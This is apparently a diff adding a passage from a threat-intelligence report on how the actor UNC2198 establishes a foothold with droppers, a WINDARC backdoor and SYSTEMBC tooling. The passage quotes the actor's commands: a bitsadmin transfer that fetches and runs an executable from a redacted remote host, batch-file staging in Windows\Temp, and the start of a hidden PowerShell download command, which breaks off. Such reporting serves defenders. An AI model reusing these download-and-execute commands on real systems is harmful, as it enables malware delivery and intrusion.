@@ -1,0 +1,11 @@
+
+Establish Foothold After obtaining access, UNC2198 has deployed additional malware using various techniques.
+For instance, UNC2198 used InnoSetup droppers to install a WINDARC backdoor on the target host.
+UNC2198 also used BITS Jobs and remote PowerShell downloads to download additional tools like SYSTEMBC for proxy and tunneler capabilities.
+Example commands for download and execution are: %COMSPEC% /C
+echo bitsadmin /transfer
+257e http://<REDACTED>/<REDACTED>.exe %APPDATA%<REDACTED>.exe & %APPDATA%<REDACTED>.exe & del %APPDATA%
+<REDACTED>.exe ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\FmpaXUHFennWxPIM.txt > \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat & %COMSPEC% /C
+start %COMSPEC% /C
+\\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat %COMSPEC% /C
+echo powershell.exe -nop -w hidden -c (new-object System.
